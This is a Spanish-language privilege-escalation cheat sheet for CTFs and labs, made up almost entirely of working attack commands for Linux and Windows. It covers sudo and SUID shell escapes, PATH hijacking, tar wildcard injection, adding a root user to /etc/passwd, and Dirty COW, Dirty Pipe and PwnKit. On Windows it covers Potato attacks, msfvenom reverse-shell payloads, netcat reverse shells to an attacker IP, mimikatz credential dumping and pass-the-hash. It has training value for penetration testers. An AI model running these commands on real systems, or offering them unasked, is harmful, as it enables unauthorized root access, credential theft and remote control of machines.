# PrivEsc — Guía de Referencia
### Privilege Escalation · Vectores comunes · CTF & lab

> ⚠️ Uso exclusivo en entornos controlados (CTF, laboratorios, sistemas propios o con autorización explícita).

**Leyendas:**
- 🐧 `linux` — específico Linux
- 🪟 `windows` — específico Windows
- 🤖 `auto` — herramienta de enumeración automática
- 💥 `kernel` — exploit de kernel
- 🟣 `gtfobins` — binario explotable

---

## ENUMERACIÓN

### 01 · Herramientas automáticas

#### LinPEAS (Linux) 🐧 🤖

Script de enumeración exhaustiva para Linux. Colorea los hallazgos por criticidad — amarillo/rojo indica vectores de escalada probables.

**¿Por qué?** — El punto de partida en casi cualquier CTF Linux. En 2-3 minutos tienes un mapa completo de la superficie de ataque: SUID, sudo, cron, capabilities, contraseñas en archivos…

```bash
# Desde tu máquina — servir el script
python3 -m http.server 8080

# En el target — descargar y ejecutar en memoria
curl http://<tu_ip>:8080/linpeas.sh | sh

# O descargar, dar permisos y ejecutar
wget http://<tu_ip>:8080/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh

# Guardar output para analizar con calma
/tmp/lp.sh | tee /tmp/linpeas_out.txt
```

---

#### WinPEAS (Windows) 🪟 🤖

Equivalente de LinPEAS para Windows. Enumera servicios, registro, credenciales almacenadas, tokens, scheduled tasks, rutas no entrecomilladas y mucho más.

**¿Por qué?** — Imprescindible en CTFs Windows. Fíjate especialmente en lo que marca en rojo: AlwaysInstallElevated, rutas sin comillas, servicios modificables, credenciales en texto plano.

```cmd
# Descargar desde tu servidor HTTP
certutil -urlcache -f http://<tu_ip>:8080/winPEASx64.exe C:\Temp\wp.exe
C:\Temp\wp.exe

# PowerShell — si certutil está bloqueado
IWR http://<tu_ip>:8080/winPEASx64.exe -OutFile C:\Temp\wp.exe; C:\Temp\wp.exe

# Guardar output
C:\Temp\wp.exe > C:\Temp\out.txt 2>&1
```

---

#### Linux Smart Enumeration — lse.sh 🐧 🤖

Alternativa más ordenada a LinPEAS. Presenta hallazgos por niveles de criticidad y es más fácil de leer en terminales pequeñas.

```bash
./lse.sh -l 0   # Nivel 0 — solo lo más crítico (rápido)
./lse.sh -l 1   # Nivel 1 — interesante (recomendado)
./lse.sh -l 2   # Nivel 2 — exhaustivo
```

---

### 02 · Enumeración manual rápida — Linux 🐧

Antes de lanzar herramientas automáticas (o cuando no puedes subirlas), estos comandos dan el 80% del contexto necesario.

#### Identidad y contexto

```bash
id                              # uid, gid, grupos
whoami
sudo -l                         # ← MUY importante: qué puedo ejecutar como root
cat /etc/passwd | grep -v nologin
cat /etc/group
```

#### Sistema y kernel

```bash
uname -a                        # versión de kernel
cat /etc/os-release
cat /proc/version
```

#### Binarios y permisos

```bash
# Binarios SUID — ejecutan como el propietario (generalmente root)
find / -perm -4000 -type f 2>/dev/null

# Binarios SGID
find / -perm -2000 -type f 2>/dev/null

# Capabilities asignadas
getcap -r / 2>/dev/null
```

#### Archivos y credenciales

```bash
# Archivos de configuración con contraseñas
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -readable 2>/dev/null
find / -name "id_rsa" 2>/dev/null    # claves SSH privadas

# Archivos con escritura para todos
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Historial de comandos
cat ~/.bash_history
cat ~/.zsh_history
```

#### Procesos y red

```bash
ps aux                          # procesos en ejecución (busca root + script)
ss -tlnp                        # puertos internos (127.0.0.1) → port forwarding
cat /etc/crontab                # tareas programadas
ls -la /etc/cron*
```

---

### 03 · Enumeración manual rápida — Windows 🪟

```cmd
# Identidad y privilegios
whoami /all                     # usuario + privilegios + grupos SID
net user %username%             # info del usuario actual
net localgroup administrators   # miembros del grupo admin

# Sistema
systeminfo                      # OS, hotfixes, arquitectura
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
wmic qfe list                   # parches instalados

# Servicios y tareas
tasklist /svc                   # procesos y sus servicios
sc query                        # servicios del sistema
schtasks /query /fo LIST /v     # tareas programadas
wmic service get name,startname,pathname  # rutas de servicios (unquoted path)

# Credenciales almacenadas
cmdkey /list                    # credenciales guardadas en Windows
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
dir /s /b *pass* *cred* *vnc* *.config 2>nul
```

---

## LINUX

### 04 · Sudo misconfigurations 🐧

#### sudo -l — el primer comando siempre

Muestra qué comandos puede ejecutar el usuario actual con sudo, y si requieren contraseña o no.

**¿Por qué?** — Es el vector más rápido y frecuente en CTFs. Si puedes ejecutar ANY como root, o un binario interpretado (python, vim, find…), hay escalada directa. Consulta GTFOBins para cada binario.

```bash
# Ejemplos de output peligroso:
(ALL : ALL) NOPASSWD: /usr/bin/python3
# → puede ejecutar python3 como root sin contraseña → escalada directa

(root) NOPASSWD: /usr/bin/find
# → GTFOBins: sudo find . -exec /bin/bash \; -quit

(ALL) ALL
# → puede ejecutar cualquier cosa → sudo su o sudo bash
```

#### Escalada con binarios comunes vía sudo

```bash
# python / python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# vim
sudo vim -c ':!/bin/bash'

# less / more
sudo less /etc/passwd
!/bin/bash          # dentro de less, escribir esto

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nano → Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0
sudo nano
```

#### PATH hijacking

**¿Por qué?** — A veces sudo permite un script específico pero ese script usa rutas relativas. Se puede secuestrar el PATH para inyectar comandos.

```bash
# Si el script permitido llama a "tar" sin ruta absoluta
echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
sudo /usr/local/bin/backup.sh     # ejecuta nuestro 'tar' falso como root
```

#### Wildcard injection (tar)

```bash
# Si cron o sudo ejecuta: tar czf backup.tgz /opt/*
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /opt/shell.sh
chmod +x /opt/shell.sh
touch /opt/--checkpoint=1
touch "/opt/--checkpoint-action=exec=sh shell.sh"
# Cuando tar expande *, los archivos actúan como flags
/tmp/rootbash -p                  # shell con SUID de root
```

---

### 05 · Binarios SUID 🐧 🟣

Un binario con el bit SUID activado se ejecuta con los permisos de su propietario (normalmente root), independientemente de quién lo lance.

**¿Por qué?** — Si find, bash, python, cp o cualquier intérprete tiene SUID de root, hay escalada directa. Siempre cruzar con GTFOBins.

```bash
# Encontrar binarios SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Filtrar solo los no estándar (los peligrosos)
find / -perm -4000 -type f 2>/dev/null | grep -v -E '/bin/|/sbin/|/usr/bin/|/usr/sbin/'
```

```bash
# bash con SUID → -p preserva privilegios efectivos
/bin/bash -p

# find con SUID
find . -exec /bin/sh -p \; -quit

# cp con SUID → sobreescribir /etc/passwd con usuario root personalizado
openssl passwd -1 -salt xyz hacked123   # genera hash
echo 'hacked:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd

# python con SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# vim con SUID
vim.tiny -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
```

---

### 06 · Cron jobs 🐧

Si root ejecuta un script periódicamente vía cron y ese script es escribible por nuestro usuario, podemos inyectar comandos que se ejecutarán como root.

**¿Por qué?** — Muy frecuente en CTFs. La clave es encontrar scripts que root ejecuta automáticamente y que nosotros podemos modificar, o que usan rutas relativas que podemos secuestrar.

```bash
# Localizar cron jobs
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly
crontab -l

# Monitorizar procesos nuevos en tiempo real (detectar crons)
watch -n 1 "ps aux | grep root"

# pspy — sin root, monitoriza procesos y crons
./pspy64
```

```bash
# Verificar permisos del script que ejecuta root
ls -la /opt/cleanup.sh

# Si somos el propietario o tiene write para todos → inyectar
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/cleanup.sh

# Esperar a que cron lo ejecute, luego:
/tmp/rootbash -p
```

---

### 07 · Capabilities 🐧

Las capabilities dan privilegios específicos a binarios sin otorgar root completo. Algunas como `cap_setuid` o `cap_sys_admin` permiten escalada directa.

**¿Por qué?** — Menos conocidas que SUID pero igual de peligrosas. LinPEAS las detecta, pero es bueno saber buscarlas manualmente.

```bash
# Encontrar capabilities
getcap -r / 2>/dev/null

# Ejemplo de output peligroso:
# /usr/bin/python3.8 = cap_setuid+ep

# cap_setuid → puede cambiar su UID a 0 (root)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl con cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

---

### 08 · Kernel exploits 🐧 💥

**¿Por qué?** — Último recurso cuando no hay otros vectores. En CTFs aparece en máquinas antiguas sin parchear. Cuidado: los kernel exploits pueden crashear el sistema.

```bash
# Identificar versión del kernel
uname -a
cat /proc/version

# Buscar exploits con linux-exploit-suggester
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh --uname "Linux 4.4.0-116-generic"
```

| CVE | Nombre | Kernels afectados |
|---|---|---|
| CVE-2016-5195 | Dirty COW | < 4.8.3 |
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 |
| CVE-2021-4034 | PwnKit (pkexec) | Casi universal |

```bash
# Dirty COW
gcc -pthread dirty.c -o dirty -lcrypt
./dirty nuevapassword
su firefart               # usuario root con la nueva password

# Dirty Pipe
gcc dirtypipe.c -o dirtypipe
./dirtypipe /etc/passwd 1 'root::0:0:root:/root:/bin/bash'
su root                   # sin contraseña

# PwnKit
make && ./pwnkit           # shell root
```

---

### 09 · NFS con no_root_squash 🐧

Si un share NFS tiene la opción `no_root_squash`, el root de la máquina cliente tiene root efectivo en ese share — puede crear binarios SUID.

```bash
# Ver exports NFS del target (desde tu máquina atacante como root)
showmount -e <target_ip>

# Montar el share
mkdir /tmp/nfs
mount -o rw,vers=3 <target_ip>:/share /tmp/nfs

# Crear binario SUID como root local
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# En el target (usuario sin privilegios)
/share/rootbash -p          # shell de root
```

---

## WINDOWS

### 10 · Token Impersonation — Potato attacks 🪟

Si el usuario tiene `SeImpersonatePrivilege` (muy común en cuentas de servicio IIS, SQL Server…), puede impersonar tokens de otros usuarios incluyendo SYSTEM.

**¿Por qué?** — El vector más frecuente en CTFs Windows de nivel medio-alto. Si `whoami /priv` muestra SeImpersonatePrivilege, hay escalada casi garantizada.

```cmd
# Verificar privilegio
whoami /priv
# Buscar: SeImpersonatePrivilege ... Enabled
```

```cmd
# GodPotato (recomendado — Windows 10/2019+)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe <tu_ip> 4444 -e cmd.exe"

# PrintSpoofer (Windows 10 / Server 2019)
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe <tu_ip> 4444 -e cmd"

# JuicyPotato (Windows < 10 / Server 2016)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe ^
  -a "/c nc.exe <tu_ip> 4444 -e cmd.exe" -t * -c {CLSID}
# Lista de CLSIDs: github.com/ohpe/juicy-potato/tree/master/CLSID
```

---

### 11 · Unquoted Service Paths 🪟

Si la ruta de un servicio tiene espacios y no está entre comillas, Windows prueba a ejecutar cada segmento como binario. Se puede colocar un ejecutable malicioso en una ruta anterior.

```powershell
# Buscar rutas vulnerables
wmic service get name,startname,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {
  $_.PathName -notmatch '"' -and $_.PathName -match ' '
} | Select Name, PathName, StartName
```

```cmd
# Ruta vulnerable ejemplo:
# C:\Program Files\My Service\bin\service.exe

# Windows intentará ejecutar en orden:
# C:\Program.exe
# C:\Program Files\My.exe   ← aquí colocamos nuestro payload

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o "My.exe"
# Copiar a C:\Program Files\My.exe y reiniciar el servicio
sc stop VulnService && sc start VulnService
```

---

### 12 · AlwaysInstallElevated 🪟

Si dos claves de registro están a 1, cualquier usuario puede instalar paquetes MSI con privilegios de SYSTEM.

```cmd
# Verificar
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Si ambas devuelven 0x1 → vulnerable
```

```bash
# Generar payload MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f msi -o evil.msi
```

```cmd
# Ejecutar en el target
msiexec /quiet /qn /i C:\Temp\evil.msi
```

---

### 13 · Weak Service Permissions 🪟

Si tenemos permisos de escritura sobre el ejecutable de un servicio que corre como SYSTEM, podemos redirigirlo a nuestro payload.

```cmd
# Con accesschk (Sysinternals)
accesschk.exe -uwcqv "%username%" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Cambiar el binario del servicio
sc config VulnSvc binpath= "C:\Temp\nc.exe <ip> 4444 -e cmd.exe"
sc stop VulnSvc && sc start VulnSvc
```

---

### 14 · SAM / LSASS — Dumping de credenciales 🪟

Si ya eres admin local pero necesitas credenciales de dominio u otros usuarios, el dumping de LSASS puede dar hashes o contraseñas en texto plano.

```
# mimikatz
privilege::debug
sekurlsa::logonpasswords     # contraseñas y hashes de sesiones activas
lsadump::sam                 # hashes del SAM local
lsadump::secrets             # secretos LSA
```

```cmd
# Sin mimikatz — via registro (requiere admin)
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
```

```bash
# En tu máquina — extraer hashes con secretsdump
impacket-secretsdump -sam sam -system system LOCAL
```

---

## GTFOBins — Referencia rápida 🟣

> Referencia completa: [gtfobins.github.io](https://gtfobins.github.io)

| Binario | Comando (SUID o sudo) | Nota |
|---|---|---|
| `bash` | `bash -p` | `-p` preserva euid de root |
| `python3` | `python3 -c 'import os; os.execl("/bin/sh","sh","-p")'` | SUID o sudo |
| `vim` | `vim -c ':!/bin/bash -p'` | sudo o SUID |
| `find` | `find . -exec /bin/sh -p \; -quit` | sudo o SUID |
| `nmap` | `nmap --interactive` → `!sh` | versiones < 5.21 |
| `less` | `sudo less /etc/passwd` → `!/bin/sh` | escribir dentro del pager |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` | sudo o SUID |
| `perl` | `perl -e 'exec "/bin/sh";'` | sudo o SUID |
| `ruby` | `ruby -e 'exec "/bin/sh"'` | sudo o SUID |
| `lua` | `lua -e 'os.execute("/bin/sh")'` | sudo o SUID |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` | sudo o SUID |
| `cp` | `cp /bin/bash /tmp/b && chmod +s /tmp/b && /tmp/b -p` | SUID — copia bash con SUID |
| `curl` | `sudo curl file:///etc/shadow -o /tmp/shadow` | lectura de archivos como root |
| `tee` | `echo 'root2::0:0::/root:/bin/bash' \| sudo tee -a /etc/passwd` | escritura privilegiada |
| `env` | `sudo env /bin/sh` | lanza shell heredando entorno |
| `man` | `sudo man man` → `!/bin/bash` | igual que less |
| `git` | `sudo git -p help config` → `!/bin/bash` | via pager interno |
| `zip` | `sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/sh"` | sudo |

---

## Flujos completos

### Linux — de shell a root

```bash
# 1 — reconocimiento inmediato (2 min)
id && sudo -l && uname -a
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab && ls /etc/cron.d/
# → Si hay binario en sudo -l: GTFOBins. Si no, continuar.

# 2 — herramienta automática
python3 -m http.server 8080   # en tu máquina
curl http://<tu_ip>:8080/linpeas.sh | sh 2>&1 | tee /tmp/lp.txt
# → Analizar rojo/amarillo primero.

# 3 — si hay cron jobs sospechosos
./pspy64
# → Observar procesos lanzados por UID=0

# 4 — si el kernel es antiguo
uname -r && ./linux-exploit-suggester.sh
# → Evaluar: Dirty COW, Dirty Pipe, PwnKit
```

### Windows — de shell a SYSTEM

```cmd
# 1 — reconocimiento inmediato
whoami /all
# → ¿SeImpersonatePrivilege? → GodPotato / PrintSpoofer

systeminfo | findstr /B /C:"OS" /C:"Hotfix"
wmic service get name,pathname | findstr /i /v "C:\Windows\\"

# 2 — herramienta automática
certutil -urlcache -f http://<tu_ip>:8080/winPEASx64.exe C:\Temp\wp.exe
C:\Temp\wp.exe

# 3 — credenciales almacenadas
cmdkey /list
runas /savecred /user:administrator "C:\Temp\nc.exe <ip> 4444 -e cmd"

# 4 — Pass the Hash si tenemos hashes NTLM
impacket-psexec administrator@<target_ip> -hashes :<NTLM_hash>
impacket-wmiexec administrator@<target_ip> -hashes :<NTLM_hash>
```

---

*PrivEsc Reference — uso exclusivo en entornos autorizados · CTF / laboratorio · gtfobins.github.io*
